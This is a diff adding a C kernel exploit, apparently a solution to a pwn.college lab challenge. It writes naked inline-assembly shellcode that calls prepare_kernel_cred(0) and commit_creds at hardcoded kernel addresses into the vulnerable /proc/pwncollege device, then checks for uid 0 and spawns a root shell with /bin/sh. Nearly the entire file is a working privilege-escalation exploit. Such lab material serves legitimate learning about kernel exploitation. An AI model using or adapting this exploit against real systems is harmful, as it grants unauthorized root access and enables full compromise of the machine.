@@ -1,0 +1,41 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <fcntl.h>  // define open, O_RDONLY, O_WRONLY, O_CREAT 
+#include <unistd.h> // read, write
+#include <sys/ioctl.h> // ioctl
+
+__attribute__((naked,noinline)) void privilege_escalation_kernel_shellcode(){
+    __asm__ (
+        "mov rbx, 0xffffffff810895e0;" //prepare_kernel_cred_addr
+        "mov rdi, 0;"
+        "call rbx;"     //prepare_kernel_cred(0)
+        "mov rdi, rax;" 
+        "mov rbx, 0xffffffff810892c0;" //commit_creds_addr
+        "call rbx;"
+        "nop;"
+        "ret;"
+    );
+}
+
+void get_root(){
+    if(getuid()!=0){
+        printf("failed to get root!\n");
+        exit(0);
+    }
+    printf("get root success! execve shell....\n");
+    system("/bin/sh");
+    exit(0); //exit normally
+}
+
+int main(){
+    int fd = open("/proc/pwncollege",O_RDWR);
+    if(fd == -1){
+        puts("open file fail!");
+    }
+    printf("fd=%d\n",fd);
+
+    write(fd,privilege_escalation_kernel_shellcode+4,0x100);// rid of enbr64
+    get_root();
+    return 0;
+}
